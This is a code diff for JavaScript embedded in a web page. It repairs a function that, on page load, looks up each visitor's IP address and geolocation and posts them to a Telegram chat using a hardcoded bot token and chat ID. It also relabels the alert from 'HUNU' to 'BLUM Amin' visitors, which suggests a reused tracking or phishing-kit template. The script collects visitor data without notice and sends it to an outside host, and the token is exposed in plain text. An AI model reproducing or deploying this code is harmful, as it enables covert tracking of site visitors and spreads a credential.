@@ -15,15 +15,15 @@
   function sendToTelegram(ip, country, flag) {
     var chatId = '-4588178755'; // Replace with your chat ID
     var botToken = '8142056935:AAExRDzf1sfiOIMyPOY17DF8B2hxFmea2zU'; // Replace with your bot token
-    var message = 
-🌐 **New HUNU Visitor **
+    var message = `
+🌐 New BLUM Amin Visitor 
 
-📍 **IP Address:** ${ip}
-🌍 **Location:** ${country} ${flag}
-;
+📍 IP Address: ${ip}
+🌍 Location: ${country} ${flag}
+`;
 
     // Construct the URL for sending the message
-    var url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};
+    var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
     // Send the message using AJAX
     var xhr = new XMLHttpRequest();
@@ -46,7 +46,7 @@
         var ip = data.ip;
 
         // Get geolocation data based on IP
-        fetch(https://ipapi.co/${ip}/json/)
+        fetch(`https://ipapi.co/${ip}/json/`)
           .then(response => response.json())
           .then(geoData => {
             var country = geoData.country_name;
